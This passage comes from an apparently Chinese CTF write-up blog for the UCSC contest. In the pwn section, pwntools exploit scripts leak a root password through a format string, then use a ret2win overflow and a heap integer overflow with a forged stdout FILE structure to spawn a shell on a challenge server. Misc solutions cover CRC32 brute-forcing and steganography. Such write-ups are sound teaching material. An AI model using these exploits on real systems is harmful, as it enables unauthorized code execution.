punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        p<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>预判exp</p>\n<pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char * argv[])&#123;\n        uint8_t dmg;\n\n        for(int i&#x3D;0;i&lt;atoi(argv[1]);i++)&#123;\n                &#x2F;&#x2F;int item &#x3D; rand() % 4;\n                dmg &#x3D; rand() % 255;\n                printf(&quot;%d\\n&quot;, dmg);\n        &#125;\n&#125;</code></pre>\n\n<h3 id=\"userlogin-ucsc\"><a href=\"#userlogin-ucsc\" class=\"headerlink\" title=\"userlogin-ucsc\"></a><strong>userlogin-ucsc</strong></h3><p>登陆普通用户有格式化字符串漏洞，泄漏root密码打ret2win</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"\")</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.107.58.236\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42744</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"supersecureuser\"</span><span class=\"token punctuation\">)</span>\nrl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"%13$s\"</span><span class=\"token punctuation\">)</span>\nroot<span class=\"token operator\">=</span>rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> root\n\nrop<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0401276</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0401261</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> root<span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\n\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"疯狂复制-ucsc\"><a href=\"#疯狂复制-ucsc\" class=\"headerlink\" title=\"疯狂复制-ucsc\"></a><strong>疯狂复制-ucsc</strong></h3><p>edit函数有整数溢出，添负数可以控制stdout和stdin结构题。先塞满0x90的tcache，再释放0x90大小的堆块来让他到unsorted bin，再创在一个堆块来拿到libc泄漏，最后更改stdout打io。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"./chal\")</span>\nlibc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc.so.6\"</span><span class=\"token punctuation\">)</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.107.58.236\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45181</span><span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">view</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        add<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span>\nview<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\": \"</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>address<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x3ebd20</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">\"\"\"\nfake_io=flat(&#123;\n        0x0: \" sh;\",\n        0x68: libc.symbols['system'],\n        0x88: libc.sym[\"environ\"]-0x10,\n        0xa0: libc.symbols['_IO_2_1_stdout_'],\n        0xd8: libc.sym[\"_IO_wfile_jumps\"]-0x20,\n        0xe0: libc.symbols['_IO_2_1_stdout_']\n&#125;, filler=\"\\0\")\n\"\"\"</span>\n\nfake_io <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">b'  sh;'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x8</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x28</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x68</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x88</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_environ'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa0</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xd0</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xd8</span><span class=\"token punctuation\">:</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_wfile_jumps'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> filler<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span>\n\n\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        add<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#debug(\"break *_IO_wdoallocbuf\\nc\")</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#debug()</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h3 id=\"USB-ucsc\"><a href=\"#USB-ucsc\" class=\"headerlink\" title=\"USB-ucsc\"></a><strong>USB-ucsc</strong></h3><p>CTF-NetA一把梭</p>\n<p><img src=\"/images/1745240699575-12.png\" alt=\"img\"></p>\n<p>flag{ebdfea9b-3469-41c7-9070-d7833ecc6102}</p>\n<h3 id=\"小套不是套-ucsc\"><a href=\"#小套不是套-ucsc\" class=\"headerlink\" title=\"小套不是套-ucsc\"></a><strong>小套不是套-ucsc</strong></h3><p>对套.zip执行CRC32爆破。</p>\n<p>代码：</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> binascii <span class=\"token keyword\">import</span> crc32\n<span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> zipfile\ndic<span class=\"token operator\">=</span>string<span class=\"token punctuation\">.</span>printable\n<span class=\"token keyword\">def</span> <span class=\"token function\">CrackCrc</span><span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> dic <span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># print (i)</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> dic<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> dic<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">for</span> q <span class=\"token keyword\">in</span> dic<span class=\"token punctuation\">:</span>\n                    s<span class=\"token operator\">=</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span>p<span class=\"token operator\">+</span>q\n                    <span class=\"token comment\"># print (crc32(bytes(s,'ascii')) &amp; 0xffffffff)</span>\n                    <span class=\"token keyword\">if</span> crc <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>crc32<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span><span class=\"token string\">'ascii'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">return</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">getcrc32</span><span class=\"token punctuation\">(</span>fname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    l<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> fname\n    f <span class=\"token operator\">=</span> zipfile<span class=\"token punctuation\">.</span>ZipFile<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">global</span> fileList\n    fileList <span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>namelist <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>fileList<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print (type(fileList))</span>\n    <span class=\"token keyword\">for</span> filename <span class=\"token keyword\">in</span> fileList<span class=\"token punctuation\">:</span>\n        Fileinfo <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>getinfo<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(Fileinfo)</span>\n        crc <span class=\"token operator\">=</span> Fileinfo<span class=\"token punctuation\">.</span>CRC\n        <span class=\"token comment\"># print ('crc',crc)</span>\n        l<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> l\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span>filename<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    l <span class=\"token operator\">=</span> getcrc32<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(l)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fileList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">'的内容是:'</span><span class=\"token punctuation\">)</span>\n        CrackCrc<span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n \n<span class=\"token keyword\">if</span> __name__  <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main <span class=\"token punctuation\">(</span><span class=\"token string\">'test.zip'</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><img src=\"/images/1745240699575-13.png\" alt=\"img\"></p>\n<p>按照f后面数字的顺序拼接起来，随后cyberchef一把梭：</p>\n<p><img src=\"/images/1745240699575-14.png\" alt=\"img\"></p>\n<p>另一个压缩包打开之后里面还有一个压缩包，伪加密解出来是一张图：</p>\n<p><img src=\"/images/1745240699575-15.jpeg\" alt=\"img\"></p>\n<p>010，发现还有一张图。</p>\n<p><img src=\"/images/1745240699575-16.png\" alt=\"img\"></p>\n<p>补一下png头。能搞出来另外一张图：</p>\n<p><img src=\"/images/1745240699575-17.png\" alt=\"img\"></p>\n<p>IEDN后面就是oursecret加密的特征</p>\n<p><img src=\"/images/1745240699575-18.png\" alt=\"img\"></p>\n<p>结合上面的密钥。oursecret解出flag。</p>\n<p><img src=\"/images/1745240699575-19.png\" alt=\"img\"></p>\n<h3 id=\"three-ucsc\"><a href=\"#three-ucsc\" class=\"headerlink\" title=\"three-ucsc\"></a><strong>three-ucsc</strong></h3><p>part1:8f02d3e7</p>\n<p><img src=\"/images/1745240699575-20.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699575-21.png\" alt=\"img\"></p>\n<p>part2:-ce89-4d6b-830e-</p>\n<p><img src=\"/images/1745240699575-22.png\" alt=\"img\"></p>\n<p>part3:5d0cb5695077</p>\n<p>压缩包密码thinkbell</p>\n<p><img src=\"/images/1745240699575-23.png\" alt=\"img\"></p>\n<h3 id=\"No-shArk-ucsc\"><a href=\"#No-shArk-ucsc\" class=\"headerlink\" title=\"No.shArk-ucsc\"></a>No.shArk-ucsc</h3><p><img src=\"/images/1745240699575-24.png\" alt=\"img\"></p>\n<p>流量中存在0101数据，转成二维码，修复完二维码扫描得到一个字符串”Y0U_Fi8d_ItHa@aaHH”。</p>\n<p><img src=\"/images/1745240699575-25.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699575-26.png\" alt=\"img\"></p>\n<p>流量中提取出三个文件和一个存在SNOW数据的html。</p>\n<p>发现有SNOW隐写提示，使用SNOW解密出后半部分flag。</p>\n<p><img src=\"/images/1745240699575-27.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699575-28.png\" alt=\"img\"></p>\n<p><img src=\"/images/1745240699576-29.png\" alt=\"img\"></p>\n<p>结合提示，猜测另一个png图是要用Arnold Cat map变化来爆破出正确flag图。</p>\n<p>百度找到的脚本直接可用（<a href=\"https://www.cnblogs.com/alexander17/p/18551089%EF%BC%89%E3%80%82\">https://www.cnblogs.com/alexander17/p/18551089）。</a></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> matplotlib<span class=\"token punctuation\">.</span>pyplot <span class=\"token keyword\">as</span> plt\n<span class=\"token keyword\">import</span> cv2\n<span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">arnold_decode</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span> shuffle_times<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\" decode for rgb image that encoded by Arnold\n    Args:\n        image: rgb image encoded by Arnold\n        shuffle_times: how many times to shuffle\n    Returns:\n        decode image\n    \"\"\"</span>\n    <span class=\"token comment\"># 1:创建新图像</span>\n    decode_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span>shape<span class=\"token operator\">=</span>image<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 2：计算N</span>\n    h<span class=\"token punctuation\">,</span> w <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> image<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    N <span class=\"token operator\">=</span> h  <span class=\"token comment\"># 或N=w</span>\n\n    <span class=\"token comment\"># 3：遍历像素坐标变换</span>\n    <span class=\"token keyword\">for</span> time <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>shuffle_times<span class=\"token 